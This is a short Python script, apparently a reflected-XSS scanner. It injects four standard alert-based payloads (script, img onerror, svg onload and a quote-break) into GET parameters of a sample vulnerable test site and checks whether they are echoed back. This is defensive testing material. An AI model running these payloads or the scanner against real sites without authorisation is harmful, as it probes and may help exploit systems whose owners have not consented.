import requests

# Common XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'; alert('XSS');",
]

def test_xss(url, params):
    """
    Test for XSS vulnerabilities in a given URL and parameters.

    :param url: Target URL to test
    :param params: List of input field names
    """
    vulnerable = False

    for param in params:
        for payload in XSS_PAYLOADS:
            # Inject payload into the specific parameter
            data = {p: (payload if p == param else "test") for p in params}

            try:
                response = requests.get(url, params=data, timeout=5)
                
                # Check if payload appears in the response
                if payload in response.text:
                    print(f"[!] XSS detected on {url} with {param}={payload}")
                    vulnerable = True
                    break  # Stop testing if vulnerability is found

            except requests.RequestException:
                print(f"[ERROR] Failed to connect to {url}")

    if not vulnerable:
        print("[INFO] No XSS vulnerabilities detected.")

# Example usage
if __name__ == "__main__":
    target_url = "http://testphp.vulnweb.com/search.php"
    test_params = ["search"]  # Modify based on the form field names
    test_xss(target_url, test_params)